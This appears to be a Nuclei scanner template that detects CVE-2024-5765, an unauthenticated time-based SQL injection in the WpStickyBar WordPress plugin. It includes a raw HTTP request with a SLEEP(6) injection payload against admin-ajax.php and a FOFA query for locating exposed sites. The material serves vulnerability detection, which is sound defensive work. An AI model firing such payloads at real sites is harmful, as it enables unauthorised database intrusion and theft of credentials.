flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "/plugins/wpstickybar-sticky-bar-sticky-header")
    internal: true
    type: dsl
  max-redirects: 2
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    type: dsl
  raw:
  - '@timeout: 15s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=stickybar_display&banner_id=1%20AND%20SLEEP(6);

    '
id: CVE-2024-5765
info:
  author: theamanrawat
  classification:
    cve-id: CVE-2024-5765
    cwe-id: CWE-89
    epss-percentile: 0.98965
    epss-score: 0.78175
  description: 'The plugin does not properly sanitise and escape a parameter before
    using it in a SQL statement via an AJAX action available to unauthenticated users,
    leading to a SQL injection

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection attacks
    to extract sensitive database information including user credentials and configuration
    data.

    '
  metadata:
    fofa-query: body="/plugins/wpstickybar-sticky-bar-sticky-header"
    max-request: 2
    verified: true
  name: WpStickyBar <= 2.1.0 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/0b73f84c-611e-4681-b362-35e721478ba4/
  - https://wordpress.org/plugins/wpstickybar-sticky-bar-sticky-header/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-5765
  remediation: 'Update WpStickyBar plugin to version 2.1.1 or later to address the
    SQL injection vulnerability.

    '
  severity: high
  tags: time-based-sqli,cve,cve2024,sqli,wpscan,wordpress,wp-plugin,wp,wpstickybar,unauth,vuln
